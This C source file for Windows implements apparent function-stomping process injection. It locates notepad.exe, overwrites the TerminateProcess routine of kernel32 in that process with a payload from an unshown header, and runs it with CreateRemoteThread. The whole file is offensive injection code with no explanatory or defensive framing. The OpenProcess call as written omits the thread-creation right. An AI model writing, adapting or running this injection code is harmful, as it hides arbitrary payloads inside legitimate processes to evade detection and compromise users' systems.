#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Payload.h"

DWORD FindPID( LPCSTR procName ) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "Failed to create snapshot. Error: %lu\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );

    if ( Process32First( hSnapshot, &pe ) ) {
        do {
            if ( strcmp( pe.szExeFile, procName ) == 0 ) {
                pid = pe.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}

int main() {
    LPCSTR procName = "notepad.exe";

    DWORD pid = FindPID( procName );

    if ( !pid ) {
        printf( "Process %s not found.\n", procName );
        return 1;
    }

    printf( "Found process %s with PID: %lu\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid );

    if ( !hProcess ) {
        printf( "Failed to open process. Error: %lu\n", GetLastError() );
        return 1;
    }

    FARPROC targetFunc = GetProcAddress( GetModuleHandleA( "kernel32.dll" ), "TerminateProcess" );

    DWORD oldProtect;

    if ( !VirtualProtectEx( hProcess, ( LPVOID )targetFunc, payloadSize, PAGE_READWRITE, &oldProtect ) ) {
        fprintf( stderr, "Failed to change memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, ( LPVOID )targetFunc, payload, payloadSize, &bytesWritten ) ) {
        fprintf( stderr, "Failed to write payload to target process. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] Wrote %zu bytes to target process.\n", bytesWritten );

    if ( !VirtualProtectEx( hProcess, ( LPVOID )targetFunc, payloadSize, oldProtect, &oldProtect ) ) {
        fprintf( stderr, "Failed to restore memory protection. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )targetFunc, NULL, 0, NULL );
    if ( !hThread ) {
        fprintf( stderr, "Failed to create remote thread. Error: %lu\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    WaitForSingleObject( hThread, INFINITE );

    return 0;
}